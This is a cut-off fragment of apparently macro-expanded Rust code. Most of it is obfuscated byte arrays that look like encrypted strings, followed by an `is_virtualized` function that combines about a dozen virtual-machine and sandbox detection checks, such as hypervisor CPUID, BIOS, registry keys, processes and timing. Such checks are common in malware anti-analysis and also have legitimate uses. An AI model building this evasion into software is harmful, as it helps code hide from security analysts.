122 , 11 , 4 , 249 , 249 , 33 , 212 , 195 , 78 , 238 , 9 , 93 , 83 , 212 , 87 , 9 , 172 , 177 , 73 , 175 , 196 , 228 , 219 , 213 , 33 , 219 , 246 , 71 , 7 , 153 , 42 , 162 , 106 , 97 , 47 , 197 , 220 , 36 , 153 , 173 , 144 , 231 , 226 , 30 , 157 , 189 , 128 , 225 , 237 , 146 , 244 , 138 , 238 , 90 , 235 , 204 , 49 , 9 , 183 , 113 , 61 , 28 , 216 , 90 , 103 , 137 , 118 , 236 , 30 , 199 , 255 , 145 , 162 , 219 , 66 , 90 , 23 , 190 , 219 , 0 , 76 , 173 , 20 , 187 , 209 , 151 , 62 , 103 , 228 , 174 , 66 , 40 , 183 , 54 , 58 , 201 , 39 , 28 , 40 , 248 , 38 , 109 , 188 , 115 , 156 , 95 , 180 , 46 , 12 , 22 , 220 , 103 , 239 , 198 , 8 , 232 , 52 , 214 , 159 , 156 , 22 , 45 , 158 , 205 , 72 , 142 , 38 , 46 , 179 , 137 , 131 , 18 , 26 , 164 , 173 , 36 , 106 , 2 , 76 , 142 , 80 , 174 , 201 , 19 , 61 , 41 , 255 , 214 , 96 , 134 , 77 , 61 , 77 , 177 , 250 , 154 , 155 , 135 , 156 , 98 , 49 , 232 , 99 , 152 , 234 , 63 , 122 , 224 , 179 , 191 , 247 , 53 , 248 , 54 , 27 , 178 , 220 , 141 , 77 , 91 , 161 , 30 , 152 , 162 , 155 , 139 , 24 , 157 , 96 , 196 , 131 , 14 , 103 , 222 , 71 , 125 , 168 , 25 , 24 , 28 , 28 , 142 , 231 , 11 , 29 , 91 , 137 , 149 , 248 , 182 , 46 , 249 , 40 , 206 , 120 , 32 , 10 , 160 , 116 , 215 , 189 , 71 , 185] , & [40 , 130 , 84 , 154 , 167 , 235 , 72 , 126 , 254 , 130 , 130 , 176 , 53 , 11 , 174 , 11 , 15 , 59 , 196 , 8 , 127 , 110 , 16 , 14 , 129 , 2 , 254 , 178 , 63 , 53 , 187 , 35 , 159 , 99 , 80 , 63 , 127 , 133 , 214 , 230 , 172 , 180 , 206 , 102 , 12 , 68 , 33 , 223 , 221 , 208 , 205 , 109 , 136 , 131 , 184 , 109 , 122 , 173 , 95 , 158 , 152 , 180 , 92 , 146 , 228 , 211 , 66 , 119 , 185 , 80 , 156 , 96 , 119 , 115 , 11 , 45 , 155 , 98 , 104 , 8 , 226 , 245 , 231 , 192 , 59 , 42 , 2 , 83] , 88854283421529u64) ,] ; for dir in & vm_dirs { if Path :: new (& * * dir) . exists () { return true ; } } false } pub fn is_virtualized () -> bool { check_cpuid_hypervisor () || check_mac_address () || check_bios () || check_cpu_cores () || check_memory_size () || check_disk_size () || check_display_adapter () || check_pci_devices () || check_drivers () || check_vm_registry_keys () || check_vm_processes () || check_rdtsc_timing () }